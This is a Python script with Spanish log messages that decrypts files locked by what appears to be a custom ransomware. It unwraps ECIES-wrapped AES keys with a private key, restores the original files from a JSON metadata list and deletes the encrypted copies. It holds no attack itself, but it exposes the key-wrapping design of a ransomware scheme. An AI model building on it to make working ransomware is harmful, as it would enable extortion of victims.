import os
import struct
import json
import base64
import logging

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

IV_LEN = 12
TAG_LEN = 16
CHUNK_SIZE = 64 * 1024
SALT_LEN = 16
HKDF_LEN = 32
ECIES_VERSION = 1

def ecies_unwrap(blob, private_key):
    try:
        offset = 0
        
        version = blob[offset]
        offset += 1
        if version != ECIES_VERSION:
            raise ValueError(f"Versión ECIES no soportada: {version}")
        
        salt_len = blob[offset]
        offset += 1
        if salt_len != SALT_LEN:
            raise ValueError(f"Longitud de salt inválida: {salt_len}")
        salt = blob[offset:offset + salt_len]
        offset += salt_len
        
        eph_pub_len = struct.unpack(">H", blob[offset:offset + 2])[0]
        offset += 2
        eph_pub_der = blob[offset:offset + eph_pub_len]
        offset += eph_pub_len
        
        eph_pub = serialization.load_der_public_key(eph_pub_der)
        
        iv = blob[offset:offset + IV_LEN]
        offset += IV_LEN
        
        ct_len = struct.unpack(">I", blob[offset:offset + 4])[0]
        offset += 4
        ciphertext = blob[offset:offset + ct_len]
        offset += ct_len
        
        tag = blob[offset:offset + TAG_LEN]
        
        shared = private_key.exchange(ec.ECDH(), eph_pub)
        
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=HKDF_LEN,
            salt=salt,
            info=b"ecies-aes-gcm",
        )
        wrap_key = hkdf.derive(shared)
        
        aesgcm = AESGCM(wrap_key)
        aad = struct.pack("B", ECIES_VERSION) + eph_pub_der + salt
        aes_key = aesgcm.decrypt(iv, ciphertext + tag, aad)
        
        return aes_key
        
    except Exception as e:
        logger.error(f"Error al desenvolver clave ECIES: {e}")
        raise

def decrypt_file(encrypted_path, aes_key, output_path):
    if not os.path.isfile(encrypted_path):
        logger.warning(f"Archivo encriptado no existe: {encrypted_path}")
        return False
    
    try:
        with open(encrypted_path, "rb") as fin:
            iv = fin.read(IV_LEN)
            if len(iv) != IV_LEN:
                raise ValueError("IV incompleto en el archivo")
            
            ciphertext_and_tag = fin.read()
            
        if len(ciphertext_and_tag) < TAG_LEN:
            raise ValueError("Archivo corrupto: no contiene tag de autenticación")
        
        ciphertext = ciphertext_and_tag[:-TAG_LEN]
        tag = ciphertext_and_tag[-TAG_LEN:]
        
        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.GCM(iv, tag),
        )
        decryptor = cipher.decryptor()
        
        with open(output_path, "wb") as fout:
            remaining = len(ciphertext)
            offset = 0
            
            while remaining > 0:
                chunk_size = min(CHUNK_SIZE, remaining)
                chunk = ciphertext[offset:offset + chunk_size]
                fout.write(decryptor.update(chunk))
                offset += chunk_size
                remaining -= chunk_size
            
            fout.write(decryptor.finalize())
            fout.flush()
            os.fsync(fout.fileno())
        
        logger.info(f"Archivo desencriptado: {output_path}")
        return True
        
    except Exception as e:
        logger.error(f"Error al desencriptar {encrypted_path}: {e}")
        if output_path and os.path.exists(output_path):
            try:
                os.remove(output_path)
            except Exception:
                pass
        return False

def decrypt_ransomware(json_file, private_key_path, delete_encrypted=True):
    """
    Desencripta archivos usando datos del JSON y la clave privada.
    
    Args:
        json_file: Ruta al archivo JSON con metadatos de encriptación
        private_key_path: Ruta al archivo .pem con la clave privada
        delete_encrypted: Si True, elimina archivos .enc tras desencriptar
    """
    
    try:
        with open(private_key_path, "rb") as f:
            private_key = serialization.load_pem_private_key(
                f.read(),
                password=None
            )
        logger.info("Clave privada cargada exitosamente")
    except Exception as e:
        logger.error(f"Error al cargar clave privada: {e}")
        return 0
    
    if not os.path.isfile(json_file):
        logger.error(f"Archivo JSON no encontrado: {json_file}")
        return 0
    
    try:
        with open(json_file, "r", encoding='utf-8') as f:
            data = json.load(f)
        logger.info(f"Metadatos cargados desde: {json_file}")
    except Exception as e:
        logger.error(f"Error al leer JSON: {e}")
        return 0
    
    count = 0
    for entry in data:
        try:
            encrypted_path = entry["encrypted_path"]
            key_blob_b64 = entry["key_blob"]
            original_path = entry["original_path"]
            
            key_blob = base64.b64decode(key_blob_b64)
            aes_key = ecies_unwrap(key_blob, private_key)
            success = decrypt_file(encrypted_path, aes_key, original_path)
            
            if success:
                count += 1
                if delete_encrypted:
                    try:
                        os.remove(encrypted_path)
                        logger.info(f"Archivo encriptado eliminado: {encrypted_path}")
                    except Exception as e:
                        logger.warning(f"No se pudo eliminar {encrypted_path}: {e}")
            
        except KeyError as e:
            logger.error(f"Campo faltante en entrada JSON: {e}")
            continue
        except Exception as e:
            logger.error(f"Error procesando entrada: {e}")
            continue
    
    logger.info(f"Desencriptación completada. Archivos recuperados: {count}")
    return count

if __name__ == "__main__":
    JSON_FILE = r"Resultados_3\archivos_encriptados_Cifrado_53GB_000.json"
    PRIVATE_KEY_PATH = "./Keys/v2/privkey.pem"
    
    decrypt_ransomware(JSON_FILE, PRIVATE_KEY_PATH, delete_encrypted=True)